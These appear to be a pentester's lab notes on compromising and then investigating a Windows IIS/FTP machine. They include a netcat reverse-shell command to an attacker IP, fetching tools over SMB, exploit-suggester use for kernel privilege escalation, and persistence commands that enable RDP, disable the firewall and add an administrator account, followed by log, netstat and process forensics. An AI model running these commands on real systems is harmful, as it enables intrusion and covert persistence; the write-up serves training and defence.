We can attempt to run a simple NC reverse but `nc` is not native on windows

```
nc -e cmd.exe [attacker_IP] [attackeer_port]
```
![[Pasted image 20240717112318.png]]


We can create an smb share to host the `nc` executable and have it run in memory
![[Pasted image 20240717145705.png]]

This will be more advanced and stealthy

```
sudo smbserver.py a /usr/share/windows-binaries/
```

I copied winpeas over the `/usr/share/windows-binaries` and served using python
![[Pasted image 20240717154504.png]]

Remember, we are still serving this folder over smb
Now I will execute the `wget.exe` file in order to grab the winpeas onto the window machine

```
\\10.10.16.13\a\wget.exe http://10.10.16.13:8000/winPEASany.exe

After attempting to run winpeas, we learn that it can only run on certain versions of .NET

Run `sysinfo` on the windows victim and output to a file on kali and run file as argument in `wes.py`

![[Pasted image 20240717171300.png]]

WES displays Priv Esc as "Elevation of Privilege"
```
python3 wes.py systeminfo.txt | grep -i elevation
```
![[Pasted image 20240718103141.png]]


We can use this as a switch to hone in the output
```
python3 wes.py systeminfo.txt -i "Elevation of Privilege"
```


Now specify exploits only
This will return 4 results and suggests a Kernel exploit and links to Exploitdb
```
python3 wes.py systeminfo.txt -i "Elevation of Privilege" --exploits-only

**MITRE**
#TTP 
`T1068: Exploitation for Privilege Escalation`


From here, go through each one of these suggestions.
It helps to look for an official MS - exploit and look for a pre-compiled exploit to run
- This is fine for CTFs and OSCP but NOT in a real engagement
- You never want to just run pre-compiled code on a production machine. This could introduce unexpected results, trojans, or other malware
- Always inspect the original source code and compile yourself to avoid legal issues 

I initially tried
http://www.exploit-db.com/exploits/24485
https://www.exploit-db.com/exploits/15609


Lets try this one
https://www.exploit-db.com/exploits/40564/

Search for pre-compiled code - MS11-046

**DEFENSIVE ENGAGEMENT**

- Enable RDP
- Disable Firewall
- Add an Account
- Review Event Logs
- Track all attack TTP, threat hunt our exploitation


**RDP CMD**
https://www.windows-commandline.com/enable-remote-desktop-command-line/


Add RDP
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
![[Pasted image 20240718113618.png]]
![[Pasted image 20240718135139.png]]


**FIREWALL**
Disable the Firewall
```
netsh advfirewall set allprofiles state off
```
![[Pasted image 20240718113921.png]]

**ADD ACCOUNT**
```
net user carlos hack3d#! /add
```
![[Pasted image 20240718114105.png]]

**ADD USER TO ADMIN GROUP**
```
net localgroup administrators carlos /add
```
![[Pasted image 20240718114216.png]]

**CONFIRM**
```
net user carlos
```
![[Pasted image 20240718114309.png]]


**RDP INTO MACHINE**
```
sudo rdesktop -u carlos -p hack3d#! 10.10.10.5

**Navigate to IIS Management Console**

**FTP Athentication**
![[Pasted image 20240718115337.png]]

- We find the FTP Web-Server Authentication Settings
- Disabling `Anonymous` Login and enabling `Basic Authentication` could have prevented this exploit
![[Pasted image 20240718115532.png]]


**FTP Authorization**
![[Pasted image 20240718115720.png]]
- Furthermore - changing the permissions to `READ` only and specifying users would harden security and prevent anyone from writing to the server

**WEB-SERVER**
Lets investigate the logs
![[Pasted image 20240718115944.png]]
![[Pasted image 20240718120544.png]]
![[Pasted image 20240718120625.png]]
![[Pasted image 20240718120657.png]]
![[Pasted image 20240718120816.png]]

We can see Attacker IP, passwords used to FTP, and files uploaded
![[Pasted image 20240718124211.png]]

Reviewing the Web Logs reveals our scanning requests
![[Pasted image 20240718124525.png]]

**EVENT VIEWER**

![[Pasted image 20240718125100.png]]

![[Pasted image 20240718125516.png]]


**NETSTAT**

Review the established and listening connections - We find our attacker IP
```
netstat -bano
```
![[Pasted image 20240718130003.png]]

So lets trace `nc` process and try to understand its Parent Process and what it executed

```
tasklist | findstr /i nc.exe
```
![[Pasted image 20240718130839.png]]

**WMIC**
Find process information
```
wmic process where (processid=362)
```
![[Pasted image 20240718131100.png]]
- This will output everything into nice columns that we can search within and pull relevant information

```
wmic proceess where (processid=3624) get processid, parentprocessid, caption, commandline
```
![[Pasted image 20240718131312.png]]
- Continue running and updating the parent process id to reveal `nc` was actually run by the IIS server `w3wp.exe`
![[Pasted image 20240718131521.png]]

`svchost.exe` - started the IIS service
![[Pasted image 20240718131837.png]]

And so on and so forth...
![[Pasted image 20240718131717.png]]

Now we can explain the attack narrative

**USE STRINGS**

```
strings nc.DMP | grep -inE '([0-9]{1,3}[\.]){3}[0-9]{1,3}'
```
![[Pasted image 20240718134445.png]]

This can be done on each memory dump!
- Search for commands, IPs, domains etc to corroborate evidence and attack narrative!

**NISHANG**

For the sake of completeness and using Powershell, I will use the Nishang Framework to gain an initial foothold as an alternative to using standard CMD Prompt

```
locate nishang | grep -i tcp
```
